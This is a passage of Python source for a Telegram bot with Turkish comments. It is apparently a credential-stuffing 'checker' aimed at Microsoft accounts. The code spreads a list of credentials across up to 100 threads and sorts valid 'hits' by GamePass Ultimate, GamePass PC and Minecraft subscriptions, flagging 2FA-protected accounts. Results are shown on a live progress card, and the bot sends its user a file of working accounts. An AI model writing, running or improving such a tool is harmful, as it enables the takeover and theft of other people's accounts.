                            with stats_lock: local_stats["errors"] += 1
                    else: 
                        with stats_lock: local_stats["errors"] += 1
                else: 
                    with stats_lock: local_stats["bad"] += 1
            
            task_queue.task_done()
            time.sleep(0.05)

    # İşçileri havuz şeklinde ayağa kaldır
    thread_pool = []
    dynamic_threads = min(max_threads, total_payload)
    for i in range(dynamic_threads):
        worker = Thread(target=internal_worker, args=(i,))
        worker.daemon = True
        thread_pool.append(worker)
        worker.start()
        
    # Canlı UI Güncelleme Döngüsü
    last_reported_count = 0
    while any(w.is_alive() for w in thread_pool) and active_tasks.get(user_id, False):
        if local_stats["checked"] != last_reported_count:
            last_reported_count = local_stats["checked"]
            
            live_card = (
                f"💤 **Sleeping Canlı Analiz Tablosu** 💤\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🧵 **Aktif Thread:** `{dynamic_threads}` | 📋 **Kuyruk:** `{task_queue.qsize()}`\n"
                f"🔄 **İlerleme:** `{local_stats['checked']} / {total_payload}`\n\n"
                f"👑 **GamePass Ultimate:** `{local_stats['xgpu']}`\n"
                f"🎮 **GamePass PC:** `{local_stats['xgp']}`\n"
                f"⛏️ **Minecraft:** `{local_stats['mc']}`\n"
                f"📦 **Diğer Hit:** `{local_stats['other']}`\n\n"
                f"🔴 **Bad:** `{local_stats['bad']}` | 🟡 **2FA:** `{local_stats['twofa']}` | ❌ **Hata:** `{local_stats['errors']}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            try: 
                bot.edit_message_text(live_card, chat_id, ui_monitor.message_id, parse_mode="Markdown")
            except Exception: 
                pass
        time.sleep(1.2)

    # Tarama nihayete erdiğinde dosyaları paketle ve gönder
    bot.send_message(chat_id, f"🏁 **Tarama Sonlandı!** Toplam check edilen: `{local_stats['checked']}`", reply_markup=main_keyboard(user_id))
    
    if user_hits.get(user_id) and len(user_hits[user_id]) > 0:
        filename = f"Hits_{user_id}_{int(time.time())}.txt"
        with open(filename, "w", encoding="utf-8") as file_handle:
            file_handle.write("\n\n".join(user_hits[user_id]))
        
        with open(filename, "rb") as document_bytes:
            bot.send_document(
                chat_id, 
                document_bytes, 
                caption=f"🟢 **İşlem Başarılı!** Toplam `{len(user_hits[user_id])}` adet HIT bulundu ve text halinde paketlendi."
            )
        try: 
            os.remove(filename)
        except Exception: 
            pass
    else:
        bot.send_message(chat_id, "😢 Bu tarama işleminde maalesef hiçbir geçerli hit elde edilemedi.")
        
    # Global istatistikleri güncelle ve hafızayı temizle
    config_data = load_json(CONFIG_FILE)
    config_data["total_checked_global"] = config_data.get("total_checked_global", 0) + local_stats["checked"]
    config_data["total_hits_global"] = config_data.get("total_hits_global", 0) + len(user_hits.get(user_id, []))
    save_json(CONFIG_FILE, config_data)
    
    if user_id in active_tasks: del active_tasks[user_id]
    if user_id in user_hits: del user_hits[user_id]

# =====================================================================
# --- BOTUN ASIL ÇALIŞTIRICI ANA GÖVDESİ ---
# =====================================================================
if __name__ == '__main__':
    print("[⚙️ System Log]: Chester Lua kuralları ve limitleri kaldırdı.")
    print("[⚙️ System Log]: 100 Thread kapasiteli senkronize bot dinlemede...")
    
    # Uzun süreli istek kilitlenmelerini önlemek adına polling timeout parametreleri set edildi
    bot.infinity_polling(timeout=90, long_polling_timeout=90)
